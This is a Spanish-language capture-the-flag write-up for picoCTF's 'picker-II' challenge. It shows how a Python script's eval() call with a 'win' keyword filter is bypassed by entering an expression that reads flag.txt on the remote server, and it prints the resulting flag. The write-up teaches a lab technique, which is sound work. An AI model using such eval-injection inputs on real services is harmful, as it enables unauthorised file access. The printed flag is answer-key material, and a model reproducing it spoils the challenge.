

## Descripción
Este reto consiste en analizar el script `picker-II.py`, el cual ejecuta funciones mediante `eval()` pero incorpora un filtro que bloquea cualquier entrada que contenga la cadena `"win"`. El objetivo es acceder al contenido de `flag.txt` a pesar del filtro.

## Solución
El script funciona así:

- El usuario ingresa algo en el prompt `==>`.
- Antes de ejecutar, pasa por:

```python
def filter(user_input):
  if 'win' in user_input:
    return False
  return True
```

- Si la entrada **NO contiene** `"win"`, entonces se ejecuta:

```python
eval(user_input + '()')
```

- Si la entrada **sí contiene** `"win"`, responde con:

```
Illegal input
```

### Clave del reto:
Aunque el filtro bloquea `"win"`, **eval sigue permitiendo ejecutar cualquier otra función o expresión válida**, siempre que no incluya la palabra prohibida.

Por lo tanto, cualquier llamada que **no invoque directamente win()**, pero pueda **leer archivos**, será aceptada.

### Truco utilizado:
En Python, `eval()` puede ejecutar expresiones como:

```python
print(open('flag.txt', 'r').read())
```

El filtro NO detecta `"win"` aquí, así que la instrucción pasa sin problema.

### Pasos realizados:

1. Descargar el archivo:

```
wget https://artifacts.picoctf.net/c/523/picker-II.py
```

2. Revisar el código:

```
cat picker-II.py
```

3. Intentar leer flag localmente (falló):

```
print(open('flag.txt', 'r').read())
```

4. Conectarse al servidor remoto:

```
nc saturn.picoctf.net 50482
```

5. En el prompt `==>`, ejecutar directamente:

```
print(open('flag.txt', 'r').read())
```

Salida obtenida:

```
picoCTF{f1l73r5_f41l_c0d3_r3f4c70r_m1gh7_5ucc33d_95d44590}
'NoneType' object is not callable
```

La flag aparece correctamente en la primera línea.

## Notas adicionales
- El filtro es débil porque solo busca la cadena `"win"` en el input.
- `eval()` permite evaluar **expresiones completas**, no solo nombres de funciones.
- No es necesario romper el filtro: basta con evitarlo usando una expresión válida de Python.
- El error final `'NoneType' object is not callable` no afecta la obtención de la flag.

## Referencias
- Video: https://youtu.be/6h2S6bWu5bQ
- Archivo original: picker-II.py
